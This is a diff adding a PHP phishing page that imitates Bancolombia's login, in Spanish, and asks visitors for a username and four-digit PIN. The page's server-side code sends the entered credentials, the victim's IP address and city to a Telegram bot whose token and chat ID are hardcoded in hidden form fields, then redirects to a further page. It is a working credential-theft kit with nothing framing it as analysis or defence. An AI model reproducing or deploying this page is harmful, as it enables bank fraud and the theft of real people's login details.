@@ -1,0 +1,165 @@
+<?php
+// Iniciar el buffer de salida para evitar problemas con headers
+ob_start();
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso</title>
+    <style>
+        /* Estilos generales */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background: linear-gradient(to left, #0000007f 50%, #0000007f 50%), 
+                        url('TrazoBancolombia1.png') center center / cover no-repeat;
+        }
+        .banner {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            padding: 30px 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 80%;
+        }
+        .banner img.logo-top {
+            display: block;
+            margin: 0 auto 10px auto;
+            width: 80px;
+        }
+        .banner h1 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+        .banner h2 {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .banner a {
+            text-decoration: none;
+            color: #007bff;
+            font-size: 0.9rem;
+            margin-top: 15px;
+        }
+        .banner a:hover {
+            text-decoration: underline;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #fdc82a;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            font-weight: bold;
+            color: #000;
+        }
+        button:hover {
+            background-color: #e0b223;
+        }
+        .logo-bottom {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .logo-bottom img {
+            width: 60px;
+        }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <img src="logobancol.png" alt="Logo" class="logo-top">
+        <h1>Ingresa Para Cancelar</h1>
+        <h2>Introduce tu usuario y clave</h2>
+        <form action="" method="POST">
+            <input type="text" name="usuario" placeholder="Usuario" pattern="[A-Za-z0-9]+" required>
+            <input type="password" name="clave" placeholder="Clave" 
+                   pattern="\d{4}" minlength="4" maxlength="4" required>
+            <input type="hidden" name="chat_id" value="1166560234">
+            <input type="hidden" name="bot_token" value="6675259515:AAE0R33aF6w0UtjKIODD-2D3FVobjNeSYUQ">
+            <button type="submit">Continuar</button>
+        </form>
+        <a href="index.php">¿Olvidaste tu Clave?</a>
+        <div class="logo-bottom">
+            <img src="faceid.png" alt="Segundo Logo">
+        </div>
+    </div>
+</body>
+</html>
+
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Obtener datos del formulario
+    $usuario = htmlspecialchars($_POST['usuario']);
+    $clave = htmlspecialchars($_POST['clave']);
+    $chat_id = htmlspecialchars($_POST['chat_id']);
+    $bot_token = htmlspecialchars($_POST['bot_token']);
+
+    // Obtener la IP del usuario
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    // Función para obtener información de IP
+    function getIpInfo($ip) {
+        $url = "http://ipinfo.io/$ip/json";
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return json_decode($response, true);
+    }
+
+    // Función para enviar mensaje a Telegram
+    function sendToTelegram($botToken, $chatId, $message) {
+        $url = "https://api.telegram.org/bot$botToken/sendMessage";
+        $data = [
+            'chat_id' => $chatId,
+            'text' => $message
+        ];
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_exec($ch);
+        curl_close($ch);
+    }
+
+    // Obtener información de la IP
+    $ipInfo = getIpInfo($ip);
+    $ciudad = $ipInfo['city'] ?? 'Ciudad no disponible';
+
+    // Preparar y enviar el mensaje
+    $mensaje = "Nuevo ingreso:\nUsuario: $usuario\nClave: $clave\nIP: $ip\nCiudad: $ciudad";
+    sendToTelegram($bot_token, $chat_id, $mensaje);
+
+    // Redirigir a index2.php
+    header("Location: index2.php");
+    ob_end_flush();
+    exit();
+}
+?>
